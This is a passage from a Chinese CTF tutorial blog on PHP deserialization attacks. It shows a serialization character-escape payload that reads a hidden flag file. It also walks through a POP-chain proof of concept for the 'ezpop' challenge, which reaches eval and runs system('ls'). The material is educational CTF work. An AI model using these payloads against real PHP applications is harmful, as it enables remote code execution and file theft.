</span></span><span class=line><span class=cl>    <span class=k>echo</span> <span class=nx>file_get_contents</span><span class=p>(</span><span class=nx>base64_decode</span><span class=p>(</span><span class=nv>$userinfo</span><span class=p>[</span><span class=s1>&#39;img&#39;</span><span class=p>]));</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>进入<code>phpinfo</code>拿<code>file</code>,<code>d0g3_f1ag.php</code></p><p>首先直接写<code>payload</code></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl><span class=k>function</span> <span class=nf>filter</span><span class=p>(</span><span class=nv>$img</span><span class=p>){</span>
</span></span><span class=line><span class=cl>    <span class=nv>$filter_arr</span> <span class=o>=</span> <span class=k>array</span><span class=p>(</span><span class=s1>&#39;php&#39;</span><span class=p>,</span><span class=s1>&#39;flag&#39;</span><span class=p>,</span><span class=s1>&#39;php5&#39;</span><span class=p>,</span><span class=s1>&#39;php4&#39;</span><span class=p>,</span><span class=s1>&#39;fl1g&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nv>$filter</span> <span class=o>=</span> <span class=s1>&#39;/&#39;</span><span class=o>.</span><span class=nx>implode</span><span class=p>(</span><span class=s1>&#39;|&#39;</span><span class=p>,</span><span class=nv>$filter_arr</span><span class=p>)</span><span class=o>.</span><span class=s1>&#39;/i&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=nx>preg_replace</span><span class=p>(</span><span class=nv>$filter</span><span class=p>,</span><span class=s1>&#39;&#39;</span><span class=p>,</span><span class=nv>$img</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nv>$_SESSION</span><span class=p>[</span><span class=s2>&#34;user&#34;</span><span class=p>]</span> <span class=o>=</span> <span class=s1>&#39;guest&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nv>$_SESSION</span><span class=p>[</span><span class=s1>&#39;function&#39;</span><span class=p>]</span> <span class=o>=</span> <span class=nv>$function</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nv>$_SESSION</span><span class=p>[</span><span class=s1>&#39;img&#39;</span><span class=p>]</span><span class=o>=</span><span class=s2>&#34;ZDBnM19mMWFnLnBocA==&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nv>$serialize_info</span> <span class=o>=</span> <span class=nx>filter</span><span class=p>(</span><span class=nx>serialize</span><span class=p>(</span><span class=nv>$_SESSION</span><span class=p>));</span>
</span></span><span class=line><span class=cl><span class=k>echo</span> <span class=nv>$serialize_info</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=o>/*</span>
</span></span><span class=line><span class=cl><span class=nx>a</span><span class=o>:</span><span class=mi>3</span><span class=o>:</span><span class=p>{</span><span class=nx>s</span><span class=o>:</span><span class=mi>4</span><span class=o>:</span><span class=s2>&#34;user&#34;</span><span class=p>;</span><span class=nx>s</span><span class=o>:</span><span class=mi>5</span><span class=o>:</span><span class=s2>&#34;guest&#34;</span><span class=p>;</span><span class=nx>s</span><span class=o>:</span><span class=mi>8</span><span class=o>:</span><span class=s2>&#34;function&#34;</span><span class=p>;</span><span class=nx>N</span><span class=p>;</span><span class=nx>s</span><span class=o>:</span><span class=mi>3</span><span class=o>:</span><span class=s2>&#34;img&#34;</span><span class=p>;</span><span class=nx>s</span><span class=o>:</span><span class=mi>20</span><span class=o>:</span><span class=s2>&#34;ZDBnM19mMWFnLnBocA==&#34;</span><span class=p>;}</span>
</span></span></code></pre></td></tr></table></div></div><p>那么这里我们user是要进行字符逃逸的</p><p>我们要打入的payload</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>&#34;;s:3:&#34;img&#34;;s:20:&#34;ZDBnM19mMWFnLnBocA==&#34;;}
</span></span></code></pre></td></tr></table></div></div><p>但是这里经过逃逸之后很明显差了一个属性，我们再补一个</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>&#34;;s:3:&#34;img&#34;;s:20:&#34;ZDBnM19mMWFnLnBocA==&#34;;s:1:&#34;1&#34;;s:1:&#34;2&#34;;}
</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl><span class=k>function</span> <span class=nf>filter</span><span class=p>(</span><span class=nv>$img</span><span class=p>){</span>
</span></span><span class=line><span class=cl>    <span class=nv>$filter_arr</span> <span class=o>=</span> <span class=k>array</span><span class=p>(</span><span class=s1>&#39;php&#39;</span><span class=p>,</span><span class=s1>&#39;flag&#39;</span><span class=p>,</span><span class=s1>&#39;php5&#39;</span><span class=p>,</span><span class=s1>&#39;php4&#39;</span><span class=p>,</span><span class=s1>&#39;fl1g&#39;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nv>$filter</span> <span class=o>=</span> <span class=s1>&#39;/&#39;</span><span class=o>.</span><span class=nx>implode</span><span class=p>(</span><span class=s1>&#39;|&#39;</span><span class=p>,</span><span class=nv>$filter_arr</span><span class=p>)</span><span class=o>.</span><span class=s1>&#39;/i&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=nx>preg_replace</span><span class=p>(</span><span class=nv>$filter</span><span class=p>,</span><span class=s1>&#39;&#39;</span><span class=p>,</span><span class=nv>$img</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nv>$_SESSION</span><span class=p>[</span><span class=s2>&#34;user&#34;</span><span class=p>]</span> <span class=o>=</span> <span class=s1>&#39;flagflagflagflagflagphp&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nv>$_SESSION</span><span class=p>[</span><span class=s1>&#39;function&#39;</span><span class=p>]</span> <span class=o>=</span> <span class=s1>&#39;&#34;;s:3:&#34;img&#34;;s:20:&#34;ZDBnM19mMWFnLnBocA==&#34;;s:1:&#34;1&#34;;s:1:&#34;2&#34;;}&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nv>$_SESSION</span><span class=p>[</span><span class=s1>&#39;img&#39;</span><span class=p>]</span><span class=o>=</span><span class=s2>&#34;ZDBnM19mMWFnLnBocA==&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nv>$serialize_info</span> <span class=o>=</span> <span class=nx>filter</span><span class=p>(</span><span class=nx>serialize</span><span class=p>(</span><span class=nv>$_SESSION</span><span class=p>));</span>
</span></span><span class=line><span class=cl><span class=k>echo</span> <span class=nv>$serialize_info</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=nx>var_dump</span><span class=p>(</span><span class=nx>unserialize</span><span class=p>(</span><span class=nv>$serialize_info</span><span class=p>));</span>
</span></span></code></pre></td></tr></table></div></div><p>成功，payload为</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>/index.php?f=show_image
</span></span><span class=line><span class=cl>POST:
</span></span><span class=line><span class=cl>_SESSION[user]=flagflagflagflagflagphp&amp;_SESSION[function]=&#34;;s:3:&#34;img&#34;;s:20:&#34;ZDBnM19mMWFnLnBocA==&#34;;s:1:&#34;1&#34;;s:1:&#34;2&#34;;}
</span></span></code></pre></td></tr></table></div></div><p>得到这个</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nv>$flag</span> <span class=o>=</span> <span class=s1>&#39;flag in /d0g3_fllllllag&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=cp>?&gt;</span><span class=err>
</span></span></span></code></pre></td></tr></table></div></div><p>刚好20，直接改了打入即可</p><h2 id=pop链子>pop链子</h2><p>说实话，上面的都会了的话基本的pop链不被绕进去就行</p><p>这里给大家说了找pop链的技巧就是，反向找</p><p>先看一遍代码之后知道那个类里面有哪些魔术方法，怎么触发，然后直接锁定危险函数，比如写入文件、执行代码、读取文件等等函数，进行反向构造pop链，然后再利用魔术方法的触发进行打入，这里就讲一个Demo(个人认为基础且完整的pop)</p><p><strong>[2022DASCTF X SU 三月春季挑战赛]ezpop</strong></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span><span class=lnt>54
</span><span class=lnt>55
</span><span class=lnt>56
</span><span class=lnt>57
</span><span class=lnt>58
</span><span class=lnt>59
</span><span class=lnt>60
</span><span class=lnt>61
</span><span class=lnt>62
</span><span class=lnt>63
</span><span class=lnt>64
</span><span class=lnt>65
</span><span class=lnt>66
</span><span class=lnt>67
</span><span class=lnt>68
</span><span class=lnt>69
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>crow</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$v1</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$v2</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>function</span> <span class=nf>eval</span><span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>echo</span> <span class=k>new</span> <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>v1</span><span class=p>(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>v2</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=fm>__invoke</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>v1</span><span class=o>-&gt;</span><span class=na>world</span><span class=p>();</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>fin</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$f1</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=fm>__destruct</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>echo</span> <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>f1</span> <span class=o>.</span> <span class=s1>&#39;114514&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=nf>run</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=p>(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>f1</span><span class=p>)();</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=fm>__call</span><span class=p>(</span><span class=nv>$a</span><span class=p>,</span> <span class=nv>$b</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>echo</span> <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>f1</span><span class=o>-&gt;</span><span class=na>get_flag</span><span class=p>();</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>what</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$a</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=fm>__toString</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>a</span><span class=o>-&gt;</span><span class=na>run</span><span class=p>();</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=s1>&#39;hello&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>mix</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$m1</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=nf>run</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=p>(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>m1</span><span class=p>)();</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=nf>get_flag</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>eval</span><span class=p>(</span><span class=s1>&#39;#&#39;</span> <span class=o>.</span> <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>m1</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=p>(</span><span class=nx>isset</span><span class=p>(</span><span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;cmd&#39;</span><span class=p>]))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nx>unserialize</span><span class=p>(</span><span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;cmd&#39;</span><span class=p>]);</span>
</span></span><span class=line><span class=cl><span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nx>highlight_file</span><span class=p>(</span><span class=no>__FILE__</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>fin.__destruct-&gt;what.__toString-&gt;run()-&gt;crow.__invoke-&gt;fin.__call-&gt;__get_flag
</span></span></code></pre></td></tr></table></div></div><p>poc</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span><span class=lnt>54
</span><span class=lnt>55
</span><span class=lnt>56
</span><span class=lnt>57
</span><span class=lnt>58
</span><span class=lnt>59
</span><span class=lnt>60
</span><span class=lnt>61
</span><span class=lnt>62
</span><span class=lnt>63
</span><span class=lnt>64
</span><span class=lnt>65
</span><span class=lnt>66
</span><span class=lnt>67
</span><span class=lnt>68
</span><span class=lnt>69
</span><span class=lnt>70
</span><span class=lnt>71
</span><span class=lnt>72
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>crow</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$v1</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$v2</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>function</span> <span class=nf>eval</span><span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>echo</span> <span class=k>new</span> <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>v1</span><span class=p>(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>v2</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=fm>__invoke</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>v1</span><span class=o>-&gt;</span><span class=na>world</span><span class=p>();</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>fin</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$f1</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=fm>__destruct</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>echo</span> <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>f1</span> <span class=o>.</span> <span class=s1>&#39;114514&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=nf>run</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=p>(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>f1</span><span class=p>)();</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=fm>__call</span><span class=p>(</span><span class=nv>$a</span><span class=p>,</span> <span class=nv>$b</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>echo</span> <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>f1</span><span class=o>-&gt;</span><span class=na>get_flag</span><span class=p>();</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>what</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$a</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=fm>__toString</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>a</span><span class=o>-&gt;</span><span class=na>run</span><span class=p>();</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=s1>&#39;hello&#39;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=k>class</span> <span class=nc>mix</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=nv>$m1</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=nf>run</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=p>(</span><span class=nv>$this</span><span class=o>-&gt;</span><span class=na>m1</span><span class=p>)();</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>public</span> <span class=k>function</span> <span class=nf>get_flag</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=k>eval</span><span class=p>(</span><span class=s1>&#39;#&#39;</span> <span class=o>.</span> <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>m1</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=nv>$a</span><span class=o>=</span><span class=k>new</span> <span class=nx>fin</span><span class=p>();</span>
</span></span><span class=line><span class=cl><span class=nv>$a</span><span class=o>-&gt;</span><span class=na>f1</span><span class=o>=</span><span class=k>new</span> <span class=nx>what</span><span class=p>();</span>
</span></span><span class=line><span class=cl><span class=nv>$a</span><span class=o>-&gt;</span><span class=na>f1</span><span class=o>-&gt;</span><span class=na>a</span><span class=o>=</span><span class=k>new</span> <span class=nx>mix</span><span class=p>();</span>
</span></span><span class=line><span class=cl><span class=nv>$a</span><span class=o>-&gt;</span><span class=na>f1</span><span class=o>-&gt;</span><span class=na>a</span><span class=o>-&gt;</span><span class=na>m1</span><span class=o>=</span><span class=k>new</span> <span class=nx>crow</span><span class=p>();</span>
</span></span><span class=line><span class=cl><span class=nv>$a</span><span class=o>-&gt;</span><span class=na>f1</span><span class=o>-&gt;</span><span class=na>a</span><span class=o>-&gt;</span><span class=na>m1</span><span class=o>-&gt;</span><span class=na>v1</span><span class=o>=</span><span class=k>new</span> <span class=nx>fin</span><span class=p>();</span>
</span></span><span class=line><span class=cl><span class=nv>$a</span><span class=o>-&gt;</span><span class=na>f1</span><span class=o>-&gt;</span><span class=na>a</span><span class=o>-&gt;</span><span class=na>m1</span><span class=o>-&gt;</span><span class=na>v1</span><span class=o>-&gt;</span><span class=na>f1</span><span class=o>=</span><span class=k>new</span> <span class=nx>mix</span><span class=p>();</span>
</span></span><span class=line><span class=cl><span class=nv>$a</span><span class=o>-&gt;</span><span class=na>f1</span><span class=o>-&gt;</span><span class=na>a</span><span class=o>-&gt;</span><span class=na>m1</span><span class=o>-&gt;</span><span class=na>v1</span><span class=o>-&gt;</span><span class=na>f1</span><span class=o>-&gt;</span><span class=na>m1</span><span class=o>=</span><span class=s2>&#34;?&gt;&lt;?php system(&#39;ls&#39;);?&gt;&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=c1>//绕过的方法很多 \n \r 闭合等等
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=k>echo</span> <span class=nx>urlencode</span><span class=p>(</span><span class=nx>serialize</span><span class=p>(</span><span class=nv>$a</span><span class=p>));</span>
</span></span></code></pre></td></tr></table></div></div><p>这里查看目录之后发现是个sh文件，直接打一个<code>nl *</code>,就可以了</p><h1 id=0x03-小结>0x03 小结</h1><p>算是理了一下，更加清楚部分知识了，这里大部分讲的都是基础原理，环境基本找不到相同的，比如字符逃逸，之前nep那个，类似逃逸字符串，但是无所谓，只要知道原理还是能够很快理清打通</p></section><footer class=article-footer><div class=post-reward><div class=qr-code><div class=qr-code-image><img class=image src=https://baozongwi.xyz/wechat.png alt="WeChat QR Code"></div></div></div><section class=article-tags><a href=/tags/%E5%A7%BF%E5%8A%BF/>姿势</a>
<a href=/tags/php/>Php</a></section><section class=article-copyright><svg class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><path d="M14.5 9a3.5 4 0 100 6"/></svg>
<span>Licensed under CC BY-NC-SA 4.0</span></section></footer></article><aside class=related-content--wrapper><h2 class=section-title>Related content</h2><div class=related-content><div class="flex article-list--tile"><article><a href=/p/dynamic-debugging-pop-discovery/><div class=article-details><h2 class=article-title>动调挖掘pop</h2></div></a></article><article><a href=/p/php-non-outbound-ffi/><div class=article-details><h2 class=article-title>php中不出网的FFI</h2></div></a></article><article><a href=/p/php-native-class-exploitation/><div class=article-details><h2 class=article-title>php原生类的利用</h2></div></a></article><article><a href=/p/php-pseudo-protocols/><div class=article-details><h2 class=article-title>php伪协议</h2></div></a></article><article><a href=/p/create-function-injection/><div class=article-details><h2 class=article-title>create_function()注入</h2></div></a></article></div></div></aside><footer class=site-footer><section class=copyright>&copy;
2024 -
